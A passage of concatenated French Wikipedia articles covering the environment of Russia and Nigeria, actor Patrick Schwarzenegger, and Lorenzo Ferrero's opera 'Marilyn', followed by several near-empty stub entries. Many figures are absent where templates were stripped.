L'empreinte écologique par personne de la Russie était en 2012 d'un peu moins de 6 hag, ce qui est supérieur à la moyenne mondiale (2,6 hag). La biocapacité par personne était de 6,8 hag, valeur forte due à l'étendue du territoire par rapport à la population, de sorte que la Russie est en léger excédent écologique. Partant d'une valeur nulle en 1991, l'excédent s'est accru en raison de la baisse de l'empreinte écologique due à la décroissance économique et à la chute du régime communiste, puis diminue à cause de l'augmentation de l'empreinte due à la reprise depuis la fin des années 1990.
La biodiversité russe.
Principaux milieux naturels.
Pays le plus vaste de la planète, le territoire de la Russie s'étend d’ouest en est sur plus de km. Entouré de nombreuses mers et de deux océans, parcouru de plusieurs grands fleuves, et avec des régions faiblement anthropisées, le territoire russe offre une grande surface naturelle. La Russie est néanmoins caractérisée par un climat majoritairement continental avec des milieux froids et hostiles sur la majeure partie du territoire.
Les régions bordant l'océan Glacial Arctique sont le domaine de la toundra (12 à 15 % de la Russie), une végétation rase de mousses, de lichens, d'arbustes et de petits arbres. Le sol reste gelé plusieurs mois par an et conserve une grande humidité en été. 65 % du territoire russe est couvert de pergélisol.
Plus au sud, dans les régions où le gel devient moins présent, peut se développer la taïga, une forêt de conifères et de quelques feuillus. 60 % du territoire russe est couvert de forêts et elles représentent 20 à 25 % des forêts mondiales, avec une surface estimée à d'hectares en 2005 d'après la FAO, en diminution en 2011 et dans les années 2010. La forêt boréale résiste aux froids intenses du climat continental, mais ne se renouvelle pas rapidement. Sur la bordure méridionale de la taïga se développent les feuillus et la forêt devient mixte, notamment dans la région de Moscou. Puis la prairie remplace progressivement la forêt sur les sols noirs.
Faune et flore russe.
La faune est adaptée aux contraintes climatiques (rennes, animaux à fourrure). On trouve des loups, des ours blancs, des phoques, des renards polaires ou encore des bœufs musqués dans la Toundra. La population de tigre est en hausse en 2015 par rapport à 2010, date à laquelle la population mondiale de cette espèce en voie de disparition était la plus réduite. On comptait environ 360 tigres de Sibérie en Russie en 2008 selon l'UICN.
La flore est diversifiée, allant d'une végétation rase (avec de rares bouleaux) dans la toundra à des forêts mixtes plus au sud (bouleaux, charmes, peupliers, érables…).
Menaces sur la biodiversité russe.
Le réchauffement climatique conduit à un déplacement des espèces. Bien que la vulnérabilité au changement climatique soit faible, le réchauffement mesuré de 1976 à 2014 a été 2,5 fois plus rapide en Russie qu'au niveau mondial. La Russie connait en 2019 l'année la plus chaude de son histoire.
Par ailleurs, certains lieux sont perturbés par des espèces invasives, comme des algues sur des rives du lac Baïkal, classé au patrimoine mondial de l'humanité.
Le bécasseau spatule, qui hiverne au Bangladesh et en Birmanie, est un oiseau migrateur fortement menacé d'extinction. La chasse sur les sites d'hivernage est un des facteurs de menace.
Territoires protégés.
C'est l'un des pays au monde qui compte le plus de réserves de biosphère (plus de trente), ainsi que 64 parcs nationaux (les plus anciens datant de 1983). Les parcs nationaux sont à la charge du ministère des Ressources naturelles de la Russie.
Le gouvernement russe décide la création d'une réserve de biosphère à Sikhote-Aline en 1936. C'est aujourd'hui la principale zone d'habitat du tigre de Sibérie.
Impacts sur les milieux naturels.
Les activités humaines.
Industrie.
La Russie s'est dotée, à l'époque de l’URSS, d'une industrie lourde puissante (aciéries, raffineries, industrie chimique, etc.). Les industries liées à l'exploitation des ressources occupent une place importante dans l'économie russe et mondiale, avec le géant gazier Gazprom et le leader mondial de l'aluminium Rusal. Les secteurs liés à l’armement, au nucléaire et à l’aérospatial sont également fortement développés.
Agriculture.
La Russie est un pays exportateur, qui produit plus qu'il ne consomme de denrées agricoles. La culture du blé et des pommes de terre représente une large part de l'agriculture russe, et le pays est le premier pays exportateur de blé en 2022. L’élevage porcin et de volaille est également très répandu. En revanche, l’élevage de bovins est essentiellement destiné à la production laitière.
L'irrigation intensive (pour supporter l'agriculture intensive, notamment du coton) est en partie responsable de l'assèchement de la mer d'Aral en Asie centrale.
En août 2008, la compagnie suédoise Alpcot-Agro exploitait ha en Russie pour les céréales et les oléagineux.
Déforestation.
La Russie a perdu à elle seule plus de forêts que tous les autres pays depuis le début du .
La taïga russe a perdu en moyenne 1,4 million d’hectares de paysages forestiers intacts (IFL) par an en moyenne entre 2000 et 2013. Comparé à la période 2000-2013, la Russie a perdu en moyenne 90 % de forets de plus chaque année entre 2014 et 2016. Les mines et forages en sont la principale cause.
Transports.
Le réseau ferroviaire est bon. Le réseau autoroutier russe est en pleine expansion.
Les grandes métropoles sont équipées de métros. En 2011, la capitale, Moscou, souffrait d'un réseau routier mal développé et d'un métro saturé.
Certaines routes ne sont pas terminées en Russie, le goudron ou le sable étant partiellement détournés ; ce qui est une cause d'accident en raison des trous, affaissements...
L'utilisation de la voiture est développée. La Russie est le deuxième marche de l'entreprise française Renault, avec véhicules vendus en 2021. L'Alliance Renault-Nissan contrôle un tiers du marché russe.
Pression sur les ressources non renouvelables.
La Russie dispose de ressources minières (houille, fer, nickel, diamant, etc.) et énergétiques (pétrole, gaz naturel, hydroélectricité) abondantes qui en font l’un des principaux producteurs et exportateurs mondiaux. En juillet 2025, les exportations de pétrole représentent toujours un tiers des revenus de la Russie.
Ressources minières.
À 400 km au-dessus du cercle arctique, Norilsk abrite le combinat industriel et minier de Norilsk Nickel, premier producteur de nickel et de palladium au monde. La ville connait un niveau de pollution important.
Énergie.
Le gaz est en tête des énergies utilisées dans la production d'électricité en Russie (49,1 %), devant le nucléaire (16,6 %), le charbon (15,8 %), l'hydrothermie (15,6 %). Le pétrole (2,6 %) et les autres énergies alternatives (0,3 %) sont plus marginaux.
La Russie est copropriétaire des gazoducs Nord Stream 1 et 2 avec l’Allemagne. À la suite de la guerre que la Russie a déclenchée avec l'Ukraine en 2022, ces gazoducs prennent une ampleur stratégique et géopolitique internationale, l'Europe limitant sa consommation de gaz russe et la Russie ses exportations. En septembre 2022, 4 fuites de ces gazoducs entrainent une émission de méthane (CH4) ayant un impact important sur le réchauffement climatique. Selon les groupes climatiques, Nord Stream 1 et 2 contenaient quelque 350 000 tonnes de gaz naturel – méthane, les fuites ayant vidé les pipelines endommagés.
La Russie est le pays qui a le plus gros volume de gaz brûlé dans les torchères (37,4 milliards de mètres cubes).
Pollutions.
Les émissions de gaz à effet de serre (GES).
La Russie émettait, en 2007, l'équivalent de de tonnes de . C'est, en 2021, le quatrième pays le plus émetteur en gaz à effet de serre, avec 4,9 % des émissions mondiales, derrière la Chine (29 %), les Etats-Unis (11 %) et l'Inde (7,3 %).
Le climat, rigoureux en hiver et parfois caniculaire en été, engendre des consommations importantes d'énergie et des rejets supplémentaires.
La Russie est, avec la Chine, et les États-Unis, l'un des trois principaux émetteurs mondiaux de méthane. À lui seul, ce gaz est responsable d’environ 30 % de l’augmentation des températures globales depuis la révolution industrielle. Le dégel du permafrost, liée au réchauffement climatique mais aussi localement à des infrastructures vieillissantes (conduites de gaz...) entraine des émissions de méthane, tout comme la production de gaz, pétrole et charbon. La Russie est, de plus, le pays qui a le plus gros volume de gaz brûlé dans les torchères, ce qui amplifie les contributions de ce pays aux émissions de GES.
Le territoire est par ailleurs un important « puits de carbone », les forêts russes représentant 25 % de la surface forestière mondiale.
La pollution de l'air.
La Russie est le pays qui a le plus gros volume de gaz brûlé dans les torchères, ce qui amplifie la production de gaz polluants.
Chaque année, plus de de tonnes de gaz (dioxyde de soufre, oxyde d'azote, carbone et phénols) sont rejetés dans l'atmosphère à Norilsk. Elle est considérée en 2015 comme la la plus polluée du monde. La pollution a des effets graves : la population souffre davantage de problèmes respiratoires ou dermatologiques, en particulier les enfants, si bien que l'espérance de vie y est de seulement .
La pollution de l'eau.
La pollution de l'eau est causée par la déforestation, l'érosion du sol, une mauvaise utilisation des engrais, une fuite de produits chimiques, des cimetières des sous-marins, des oléoducs percés, des rejets urbains, etc.
Déballastages et vidanges de cargos contribuent à la pollution des mers.
La pollution des sols.
Une pollution du sol a été causée par une contamination radioactive et chimique, notamment à la suite de la catastrophe de Tchernobyl, en Ukraine.
Autour de Norilsk, de toundra ont été détruits par des pluies acides et des gaz toxiques, au point que l'herbe n'y pousse plus. L'été, beaucoup de baies sauvages et de champignons portent des traces de métaux lourds. Les habitants sont contraints de les faire bouillir s'ils veulent les consommer.
La gestion des déchets.
La Russie produit chaque année 7 milliards de tonnes de déchets, d'après le Service fédéral de surveillance des ressources naturelles. Seuls 7% des déchets sont recyclés. En 2013, la grande majorité des déchets étaient enfouis au sein de sites insalubres pour la plupart. La Russie compte sites autorisés auxquels s'ajoutent sites illégaux repérés au 15 janvier 2013. Seuls 4 à 5 % des déchets municipaux partaient vers l'un des 243 centres de recyclage, 53 unités de tri et 10 usines d'incinération des déchets. Les experts s'accordent sur un taux de recyclage de 25 % au niveau national pour le papier.
Désorganisée après la fin de l'URSS, la gestion des déchets a ressurgi dans le débat public en 2017 avec des manifestations pour la fermeture de décharges saturées autour de Moscou. Les autorités prévoient de construire de nouveaux d'incinérateurs et d'expédier des ordures dans le Grand Nord ; ce dernier projet a provoqué une vive opposition sur place et à travers le pays.
Impacts de l'urbanisation.
Malgré la faiblesse de la densité moyenne, la Russie est un pays fortement urbanisé : près des trois quarts des Russes (73 %) résident en ville, soit 106,5 millions de ses habitants. 20 % des Russes se concentrent dans les 15 villes de plus d'un million d'habitants.
L'exposition aux risques.
Les risques naturels.
La Russie est exposée à de multiples aléas naturels : inondations, tempêtes, incendies, glissements de terrain, séismes... 
Les risques environnementaux chroniques.
La région Yakoutie, en Sibérie, se trouve menacée. Ces dernières années, le réchauffement climatique provoque la fonte de sols jusqu'alors constamment gelés. Des milliers d’habitations menacent de chavirer dans la boue en été, tandis que les villages du nord sont submergés par des inondations.
Politique environnementale en Russie.
Traités internationaux.
Le 18 novembre 2004, la ratification du protocole de Kyoto par la Russie a permis son entrée en vigueur.
En 2015, dans le cadre de la COP 21, La Russie s'engage à réduire de 25 à 30 % des émissions de gaz à effet de serre d'ici à 2030 par rapport à 1990. Elle inclut l'effet de stockage de CO2 par les forêts dans le calcul des émissions. En 2017, le Président Poutine indique que la Russie ne ratifiera pas l’accord de Paris sur le climat avant 2019 et demande des précisions sur cet accord.
Lors de la troisième conférence internationale sur les villes durables, les villes russes se sont déplacées en masse.
L'héritage soviétique.
Le gouvernement de l'URSS a entravé la formation d'une conscience écologique en interdisant les partis et les associations jusque dans les . Dans les dernières années du régime stalinien, le nombre de réserves naturelles et parcs nationaux a été fortement réduit. Le productivisme a entrainé l'érosion et l'épuisement de nombreuses terres arables. Le développement d'une industrie lourde et l'exploitation intensive et extensive des ressources naturelles ont laissé derrière eux une situation préoccupante, dont souffre encore l'actuelle Russie et les anciennes Républiques soviétiques.
Dans les années 1990, les populations de sangliers, d'ours bruns et d'élans diminuent considérablement, apparemment en raison de l'effondrement de l'économie et des cultures agricoles. La chercheuse Eugenia Bragina explique que pour les sangliers, dont la population a été réduite de moitié au cours de la décennie, « l’explication est sûrement la perte de cultures dans lesquelles ils fourrageaient, car les garde-chasses ont cessé de les entretenir ».
Politiques mises en place en faveur de l'environnement.
Les énergies renouvelables, axées presque exclusivement sur l'hydrothermie, se développent et se diversifient vers le solaire, l'éolien. Un programme de construction de 170 sites de production d'énergies renouvelables est en cours en 2015. En Iakoutie, on compte déjà plus de dix sites d'exploitation de ces énergies. Si le rendement d'une centrale photovoltaïque est diminué du fait de la localisation au-delà du cercle polaire arctique, ce type d'énergie reste très intéressant pour cette région compte tenu des difficultés d'approvisionnement en énergie de cette région isolée. Une centrale de construite a Batagaï permet déjà à la ville d'économiser de fioul ; mais les panneaux ont été produits en Chine.
Un rapport du WWF publié en 2017 identifie comme causes des incendies de l'été 2010 dans la région de Moscou « la suppression de 70 000 emplois de gardes forestiers » à la fin des années 2000 et « les coupes budgétaires ayant entraîné la réduction des vols de surveillance ».
Évaluation environnementale globale.
En 2015, l'organisation "Global Footprint Network" (GFN) indique que la Russie est un des 57 pays (sur 181) préservant ses ressources (réserve en biocapacité positive), notamment grâce à sa capacité forestière qui compense largement son empreinte carbone. La biocapacité s'élève à environ 6,7 gha (hectare global par habitant), l'empreinte écologique à 4,46 gha.
Le jour du dépassement (date de l’année, calculée par l'ONG américaine Global Footprint Network, à partir de laquelle l’humanité est supposée avoir consommé l’ensemble des ressources que la planète est capable de régénérer en un an) du pays est le 26 avril. La Russie est l'un des pays dont la consommation dépasse le plus les capacités de la planète.

</doc>
<doc id="9412137" url="https://fr.wikipedia.org/wiki?curid=9412137" title="Patrick Schwarzenegger">
Patrick Schwarzenegger

Patrick Arnold Shriver Schwarzenegger, né le à Santa Monica (Californie), est un acteur américano-autrichien.
Il est le fils du culturiste, acteur et ancien gouverneur de Californie Arnold Schwarzenegger et de Maria Shriver, membre de la famille Kennedy. Il a comme grand-oncle John F. Kennedy, le président des États-Unis ainsi que les sénateurs Robert F. Kennedy et Edward M. Kennedy.
Biographie.
Famille et études.
Patrick Arnold Shriver Schwarzenegger naît le à l'hôpital à Santa Monica, et grandit à Los Angeles, en Californie.
Il est le fils aîné d’Arnold Schwarzenegger, un culturiste d'origine autrichienne, acteur et ancien gouverneur républicain de Californie et de Maria Shriver, journaliste et autrice, qui est un membre de la famille Kennedy. Il a deux sœurs, Katherine Schwarzenegger (1989) et Christina Schwarzenegger (1991), et un frère, Christopher Schwarzenegger (1997). Il a également un demi-frère, Joseph Baena (1997) d'une autre union de son père.
Son grand-oncle maternel est John Fitzgerald Kennedy, président des États-Unis ainsi que les sénateurs Robert F. Kennedy et Edward M. Kennedy. Sa grand-mère maternelle, Eunice Kennedy Shriver est la sœur cadette de l'ancien président américain John F. Kennedy et fondatrice des Jeux olympiques spéciaux.
Il étudie à l'école secondaire , à Los Angeles. En 2012, il obtient son diplôme à l'université de Californie du Sud, où il fait partie de la fraternité . En , il est diplômé de la Marshall School of Business.
Vie privée.
De à , Patrick Schwarzenegger est en couple avec l'actrice et chanteuse Miley Cyrus.
Depuis 2016, il est en couple avec le mannequin Abby Champion.
Carrière.
À l’âge de quinze ans, avec l’aide de ses parents, Patrick Schwarzenegger fonde "Project360", sa société et sa ligne de vêtements et d'accessoires, avec son ami d'enfance Nick Sheinberg. Les produits ont été vendus chez des grands détaillants comme Bloomingdale's, Henri Bendel.
En parallèle, il commence sa carrière de mannequin en intégrant l’agence . À dix-sept ans, il pose notamment torse nu pour la nouvelle campagne de publicité de la marque de jeans "Hudson Jeans" et sera visible en grand format sur Sunset Boulevard, à Hollywood.
En 2012, il obtient plusieurs petits rôles secondaires dans des films dans "L'Amour malgré tout" de Josh Boone et l'année suivante, dans "Copains pour toujours 2" de Dennis Dugan. Il fait également une apparition dans le clip "" de la chanteuse Ariana Grande.
En 2015, il décroche un petit rôle dans le film "Manuel de survie à l'apocalypse zombie" de Christopher B. Landon et apparaît dans un épisode de la série ".
En 2018, il joue le rôle principal de Charlie dans le film dramatique " de Scott Speer aux côtés de Bella Thorne, Rob Riggle et Quinn Shephard, un drame romantique sur une adolescente atteinte d'une maladie rare.
En 2019, il interprète le personnage imaginaire dans le thriller psychologique " d'Adam Egypt Mortimer, où sa performance est considérée , et qu'il joue .
En 2020, il rejoint la distribution du film de science-fiction ' d'Agata Alexander, avec Alice Eve, Alex Pettyfer, Annabelle Wallis et Thomas Jane. La même année, il rejoint également le film ' de Declan Whitebloom, aux côtés de Frank Grillo et Ruby Rose, qui sort en 2021.
En juin 2021, il est engagé pour jouer Todd Peterson, fils de l'écrivain Michael Peterson (interprété par Colin Firth), reconnu coupable du meurtre de sa femme (jouée par Toni Collette) en 2001, dans la mini-série policière " diffusée en 2022 sur la chaîne HBO Max.
En 2025, il joue le fils de "Timothy Ratliff" (interprété par Jason Isaacs) dans la troisième saison de la série d'anthologie "The White Lotus" diffusée sur la chaîne HBO.

</doc>
<doc id="9412139" url="https://fr.wikipedia.org/wiki?curid=9412139" title="Environnement au Nigeria">
Environnement au Nigeria

L'environnement au Nigeria est l'environnement (ensemble des éléments qui entourent un individu ou une espèce et dont certains contribuent directement à subvenir à ses besoins) du pays Nigeria. Le Nigeria est le pays le plus peuplé du continent africain, avec environ 187 millions d'habitants en 2016. C'est un pays qui exploite fortement ses ressources naturelles. La pression sur la forêt est très forte, ce qui a conduit a une perte de biodiversité et à une perte de capacité forestière (recyclant le dioxyde de carbone). Depuis la découverte de pétrole sur le territoire nigérian en 1956, le Nigeria est devenu le au monde qui a le plus gros volume de gaz brûlé dans les torchères. La pollution de l'air est très problématique.
L'empreinte écologique par personne du Nigéria était en 2012 de , ce qui est inférieur à la moyenne mondiale (). La biocapacité par personne était de , en diminution depuis 1970 à cause de la croissance démographique et un peu à cause de la perte de capacité forestière, de sorte que le Nigéria est en déficit écologique. Le déficit écologique du Nigéria, qui était nul en 1970, a augmenté depuis les années 1970.
La biodiversité du Nigeria.
Géographie et milieux écologiques.
Le Nigeria est situé en Afrique de l'Ouest, au bord du golfe de Guinée. Sa façade maritime est longue de , et le pays est traversé par le fleuve Niger à l’ouest et son affluent le Bénoué à l’est. L'altitude maximale est de .
Du Sud vers le Nord, l’écosystème du Nigeria est constitué par la mangrove, la forêt tropicale (au sud), la savane et la zone semi-aride. L’État de Cross River, situé sur la frontière de la République du Cameroun, possède aujourd’hui 50 % des forêts qui restent au Nigeria et il est un des points chauds de biodiversité du monde.
Faune et flore.
Au niveau de la faune et de la flore, les restes des forêts tropicales denses sont riches en feuillus (acajou). Les palmiers à huile y sont particulièrement nombreux. Baobabs, tamarinier set graminées poussent dans la savane arborée. Au nord-est, la végétation est semi-désertique. 
Les crocodiles et les serpents sont présents dans les marécages des forêts tropicales humides. 
Les grands mammifères africains, autrefois nombreux, ont disparu en raison d'un défrichement effréné. Le pays est un des cinq derniers où le lion d'Afrique est présent. En 2014, on ne comptabilisait plus que 406 individus dans la région de l’Afrique de l’Ouest. Le singe Drill est menacé d'extinction. Quelques antilopes, chameaux et hyènes vivent dans le nord.
Parmi les espèces endémiques se trouvent des scorpions, araignées, amphibiens, amphisbènes, geckos, serpents, sauriens...
Espaces protégés.
Le Nigeria compte huit parcs nationaux.
Impacts sur les milieux naturels.
Le Nigeria est le le plus peuplé au monde, avec en 2016. La population exerce de ce fait une pression importante sur les milieux et les ressources, avec une pression par habitant qui reste faible en comparaison d'autres pays plus développés.
Activités humaines.
Exploitation forestière.
le taux de disparition des forêts est un des plus élevés du monde (3,3 %). Depuis 1990, le pays en a perdu près de d’hectares, soit 35,7 % de son couvert forestier. Le Nigeria souffre de cette déforestation, due à des changements d’affectation des sols pour l’agriculture, à des abattages illicites, à des récoltes non durable d'éléments non ligneux, ou encore à l'extraction excessive de bois de feu.
Agriculture.
L'agriculture est principalement une agriculture de subsistance. La production agricole a chuté en vingt-cinq ans (cacao, volailles...). Premier producteur mondial d'huile de palme dans les années 1960, le pays le plus peuplé du continent, désormais cinquième producteur mondial, est obligé d’importer près de la moitié de sa consommation annuelle (deux millions de tonnes) en 2021. Les petits producteurs représentent 70 % de la production. Le manque d’infrastructures, l’état lamentable des routes et les coupures incessantes d’électricité freinent le développement de ce secteur.
Chasse.
Une chasse excessive a porté atteinte aux espèces animales sur le territoire (espèces en danger ).
Transports.
Il n'existe pas de réseau ferroviaire efficace. 
Les routes sont mal entretenues au Nigeria.
En 2024, les accidents sont fréquents, en grande partie à cause des excès de vitesse et du non-respect du code de la route.
Pression sur les ressources non renouvelables.
Le sous-sol est riche en ressources naturelles parmi lesquelles le pétrole et le gaz constituent la principale source de revenu du pays. 
Le pétrole a été découvert au Nigeria en 1956 dans le delta du Niger. Le pays est le premier producteur d'or noir d'Afrique. Il existe également une production extrêmement polluante d'essence de contrebande, obtenue à partir du pétrole de pipelines percés et de raffineries artisanales.
Le Nigeria produit également un certain nombre de métaux (étain, fer, plomb, zinc…) ainsi que du charbon.
Le Nigeria est le qui a le plus gros volume de gaz brûlé dans les torchères ( de mètres cubes).
Pollutions.
Les émissions de gaz à effet de serre (GES).
Le Nigeria est le au monde qui a le plus gros volume de gaz brûlé dans les torchères, ce qui amplifie les contributions de ce pays aux émissions de GES. 
C'est en 1974 que les émissions de par habitant ont été les plus importantes ( par habitant). En 2002, ces émissions étaient de de par habitant. Cette année-là, le Nigeria était le le plus émetteur au monde, avec environ de tonnes de émis.
La pollution de l'air.
94 % de la population du pays est exposée à des niveaux de pollution atmosphérique (particules fines PM 2,5) supérieurs aux directives de l’OMS. À Lagos, plus grande ville d'Afrique, la circulation devient toujours plus intense ; les émissions ne sont pas réglementées et des camions-citernes s’embrasent régulièrement en pleine ville. S'y ajoutent des rejets liés à la combustion des déchets, à l'utilisation de poêle déficient pour la cuisine, à l'utilisation de générateurs au gasoil, à la présence d'usines au cœur des villes. Encore en 2020, des raffineries européennes font exporter au Nigéria environ par an de carburant « sale » de faible qualité, présentant une teneur en soufre toxique, bien supérieure aux normes européennes, et émettant de grandes quantités de particules fines.
Le Nigeria est le deuxième pays qui a le plus gros volume de gaz brûlé dans les torchères, ce qui amplifie la production de gaz polluants.
Les trois pays les plus peuplés d’Afrique, Nigeria, Éthiopie et Égypte sont les plus affectés par les effets de la pollution. En Afrique, selon une étude de l’OCDE, le nombre de décès prématurés liés à la pollution de l’air a progressé de 36 % entre 1990 et 2013 pour s’établir à environ .
La pollution de l'eau.
En 2011, le Programme des Nations unies pour l'environnement indique une pollution pétrolière importante dans le delta du Niger. Shell a reconnu sa responsabilité dans deux importantes marées noires au Nigeria, en octobre puis décembre 2008. La communauté Bodo, qui compte environ et vit de la pêche, est victime de cette pollution.
Dans le delta du Niger, 75 % de la population n’a même pas accès à l’eau potable.
La gestion des eaux usées est un enjeu majeur du Nigeria. En 2011, la ville de Lagos génère 1,5 million de mètres cubes d’eaux usées par jour avec ses dix-huit millions d’habitants. Le tout sans système d’égouts centralisés. En dehors des fosses septiques, l’essentiel des rejets des ménages de la plus grande ville d’Afrique ruisselle dans des caniveaux ouverts jusqu’à la mer.
En mars 2018, Amnesty International publie un rapport accusant Shell et ENI de cacher la vérité sur les causes de pollution des eaux dans la région pétrolière du Delta du Niger (sud-est du Nigeria), et appelle les autorités nigérianes à ouvrir une enquête sur les déversements d’hydrocarbures dans cette zone.
La gestion des déchets.
À la fin des années 1980, de déchets chimiques ont été déchargés dans le port de Koko par des entreprises italiennes.
Un habitant d'Afrique sub-aharienne génère en moyenne 165 kg de déchets par an et par habitants en 2023 (soit nettement moins que dans les pays plus riches).
Impacts de l'urbanisation.
En 2011, environ la moitié de la population était urbaine. En 2015, Lagos était la plus grande ville d'Afrique et la grande ville du monde, avec près de 23 millions d'habitants.
Les bidonvilles sont importants. À Lagos, 70 % des habitants vivent dans des quartiers insalubres. À Makoko, important bidonville sur la lagune de la capitale, où vivent plus de , il n’y a ni eau courante, ni électricité, ni assainissement.
L'exposition aux risques.
Risques naturels.
Inondations.
En 2022, le pays connait les inondations les plus meurtrières de la décennie, avec plus de 600 morts et 1,3 million de déplacés.
En septembre 2024, le barrage d’Alo, dans le nord du Nigeria, cède sous la pression des eaux gonflées par des pluies anormalement fortes, aggravant une catastrophe ayant fait plus de 200 morts depuis la mi-juillet.
Politique environnementale au Nigeria.
Lutte contre les pollutions.
Le gouvernement du Nigeria a pris des engagements lors de la journée mondiale de l'environnement. Laurentia Mallam, alors ministre nigériane de l’Environnement, s’est engagée à améliorer la santé de l’environnement de 50 % d’ici 2020. « Les citoyens du Nigeria ont droit à un air pur, une eau potable et des terres non contaminées ».
Accords internationaux.
Le Nigéria n'était pas concerné par le Protocole de Kyoto. La Conférence de Copenhague de 2009 sur le climat est l'occasion de renégocier un accord international sur le climat remplaçant le protocole de Kyoto. Les pays émergents sont alors intégrés au processus.
En préparation de la COP 21, la politique énergétique et climatique est pensée au niveau national, puis analysée au regard de celle des autres pays africains. La position choisie est présentée au G77, puis à la COP21.
Décentralisation et acteurs locaux.
Seuls les parcs nationaux sont gérés par le gouvernement fédéral. Les réserves forestières sont sous contrôle du gouvernement de chacun des trente-six États ; les forêts communautaires sont gérées par les communautés, les forêts privées par des ONG. Alors que la protection de la forêt est globalement insuffisante, la communauté d’Ekuri dan l’État de Cross River a développé une gestion communautaire des forêts de ce territoire.
En 1995, l’écrivain nigérian engagé Ken Saro-Wiwa était exécuté par pendaison. Aux yeux de la junte militaire de l’époque, il était coupable de dénoncer les graves atteintes à l’environnement et aux droits humains causés par l’exploitation pétrolière.
Évaluation environnementale globale.
En 2015, l'organisation "Global Footprint Network" (GFN) indique que le Nigeria a un léger déficit écologique. La biocapacité par personne s'élève à environ (hectare global par habitant), l'empreinte écologique par personne à environ un hag. C'est notamment l'empreinte de la consommation de bois (environ ) qui est dix fois plus élevée que la capacité forestière ; le bilan carbone est également légèrement négatif.
La surface en forêts primaires a été divisée par plus de quatre en quinze ans, de 1990 à 2005, passant de d'hectares à .

</doc>
<doc id="9412141" url="https://fr.wikipedia.org/wiki?curid=9412141" title="Marilyn (opéra)">
Marilyn (opéra)

Marilyn, dont le sous-titre est "Scènes des années ’50 en deux actes", est un opéra de Lorenzo Ferrero sur un livret anglo-italien de Floriana Bossi et de l’auteur. Le texte est construit à partir d’extraits de documents politiques, sociaux et culturels de la vie américaine, et utilise deux niveaux linguistiques différents : anglais pour les parties chantées (confiées exclusivement à quatre personnages), et la langue du pays où se déroule le spectacle pour les parties parlées.
Située dans deux espaces, dont l'un représente la vie personnelle de Marilyn Monroe (1926-1962) et l'autre qui dépeint des moments de la vie civile et politique américaine, l'histoire mêle le mythe et le déclin de la star de cinéma jusqu'à sa mort mystérieuse, aux événements symboliques du mythe américain : la Guerre de Corée, les investigations sur les activités antiaméricaines, la poursuite de Wilhelm Reich, et les conférences de Timothy Leary sur l'utilisation des drogues psychédéliques. Marilyn est donc considérée comme une victime involontaire de la culture de masse de son temps, un personnage à la surface sereine et optimiste; une héroïne malgré elle, dont la personnalité contradictoire est représentée dans douze tableaux, également répartis dans les deux actes.
Création.
La première a lieu au Teatro dell'Opera di Roma le .
Représentations successives.
Après la création dirigée par Gianluigi Gelmetti, avec la mise en scène de Maria Francesca Siciliani et les décors d'Uberto Bertacca, l’opéra a eu d’autres productions : en Allemagne, au Staatstheater Kassel le à l’occasion de documenta, sous la direction de Alexander Sander, la mise en scène de Peter Werhan et les décors de Michael Scott; en Finlande a Vaasa le , sous la direction de Martti Tiainen, la mise en scène de Jussi Tapola et les décors de Taina Relander. Cette production a été reprise le au Théâtre national de Finlande.
Argument.
L'action se déroule dans en lieu non spécifié, dans la seconde moitié du .
Acte I.
Dans Central Park une fanfare entonne l'hymne national américain et commence à marcher ensemble avec un groupe de majorettes. Dans son propre espace, Marilyn pense à son enfance malheureuse. En Corée, face aux soldats, général MacArthur se souvient de son discours au Congrès en faveur de la guerre. Marilyn réfléchit sur sa vie et se plaint d'être considérée simplement comme un sex-symbol. Divers personnages soupçonnés d'appartenir ou de sympathiser avec le Parti communiste américain comparaissent devant la Commission des activités antiaméricaines de la Chambre des représentants pour interrogation. Marilyn appelle le Docteur Johnson au téléphone et parle de sa peur irrationnelle de devenir folle, ses sentiments de solitude et de dépersonnalisation. Dans le fond, on voit brûler des livres, y compris ceux de Wilhelm Reich. Le psychiatre, au bord de la folie, est pris en prison. Dans un duo imaginaire avec Marilyn, il tempête d'être persécuté comme Christ tandis qu'elle parle de sa détresse.
Acte II.
Un groupe de poètes de la Beat Generation se rassemblent autour de Allen Ginsberg dans un local de jazz. Ils parlent de la mort de Marilyn et regardent vers l'Est pour l'espoir sous la forme de Bouddha et Nirvana. Marilyn dîne avec Yves Montand et lui donne un de ses poèmes. Restée seule, elle chante un hymne à la nuit. La police met fin à une démonstration pacifiste silencieuse. Marilyn téléphone de nouveau à son psychanalyste, puis elle reçoit la visite d'une personne mystérieuse qui la gifle. Timothy Leary explique les effets de la LSD, Mescaline, et Psilocybine et incite le public à expérimenter avec des drogues. Marilyn, dans un état désespéré, sous l'influence de l'alcool et des barbituriques, décrit son désespoir à une poupée. Les ombres menaçantes de deux personnages masculins apparaissent sur le fond. Au secours! Au secours! crie-t-elle...
Les majorettes passent indifférentes au-dessus du cadavre de Marilyn au son de l'hymne américain, tandis que la foule fête l’"American way of life".
Airs et extraits.
L’air de Marilyn "Night of the Nite" a été publiée séparément et une "Marilyn Suite" a été jouée par l’orchestre de la RAI de Milan en 1981 et au Festival de Donaueschingen en 1982.

</doc>
<doc id="9412142" url="https://fr.wikipedia.org/wiki?curid=9412142" title="Rivière Bogue">
Rivière Bogue



</doc>
<doc id="9412144" url="https://fr.wikipedia.org/wiki?curid=9412144" title="Saurogobio">
Saurogobio

Saurogobio est un genre de poissons téléostéens de la famille des Cyprinidae et de l'ordre des Cypriniformes.
Liste des espèces.
Selon :

</doc>
<doc id="9412146" url="https://fr.wikipedia.org/wiki?curid=9412146" title="Sandor Bardozi">
Sandor Bardozi



</doc>
<doc id="9412150" url="https://fr.wikipedia.org/wiki?curid=9412150" title="J. T. Brown">
J. T. Brown



</doc>
<doc id="9412152" url="https://fr.wikipedia.org/wiki?curid=9412152" title="J.T. Brown">
J.T. Brown

J.T. Brown peut désigner :

</doc>
<doc id="9412155" url="https://fr.wikipedia.org/wiki?curid=9412155" title="After School (film, 1912)">
After School (film, 1912)



</doc>
<doc id="9412157" url="https://fr.wikipedia.org/wiki?curid=9412157" title="(134340) Pluton IV Kerbéros">
(134340) Pluton IV Kerbéros



</doc>
<doc id="9412158" url="https://fr.wikipedia.org/wiki?curid=9412158" title="(134340) Pluton II Nix">
(134340) Pluton II Nix



</doc>
<doc id="9412161" url="https://fr.wikipedia.org/wiki?curid=9412161" title="J.T. Brown (musicien)">
J.T. Brown (musicien)

J. T. Brown ( – ) est un saxophoniste ténor américain de Chicago Blues.
Il joue notamment dans les groupes d'Elmore James ou de J. B. Lenoir

</doc>
<doc id="9412162" url="https://fr.wikipedia.org/wiki?curid=9412162" title="Squalidus">
Squalidus

